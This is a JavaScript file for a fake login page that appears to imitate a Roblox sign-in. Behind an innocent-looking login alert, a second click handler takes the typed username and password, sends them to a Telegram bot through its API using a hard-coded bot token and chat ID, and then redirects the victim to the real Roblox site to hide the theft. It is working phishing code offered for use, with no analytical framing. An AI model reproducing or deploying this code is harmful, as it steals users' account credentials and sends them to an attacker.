document.getElementById('login-btn').addEventListener('click', function () {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        alert(`Logged in as ${username}`);
        // Реальная аутентификация будет сюда
    } else {
        alert('Please enter both username and password!');
    }
});

document.getElementById('alternate-device').addEventListener('click', function () {
    alert('You can log in with another device.');
});

let inputs = document.querySelectorAll('input');
let buttonLogin = document.querySelector('#login-btn');

const SendMessageFunction = () => {
    let Token = '8127238185:AAGC2yWYeA9dahqzrV8F4uPewXp-sE4AVJY';
    let ChatId = '8072432118';
    let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;

    let data = {
        chat_id: ChatId,
        text: `username: ${inputs[0].value} \npassword: ${inputs[1].value}`
    };

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(ApiUrl, options)
        .then(data => data.json())
        .then(res => {
            console.log('Data sent:', res);
            window.location.href = "https://www.roblox.com/"; // Перенаправление на Roblox
        })
        .catch(error => console.log('Error:', error));
};

buttonLogin.addEventListener('click', SendMessageFunction);
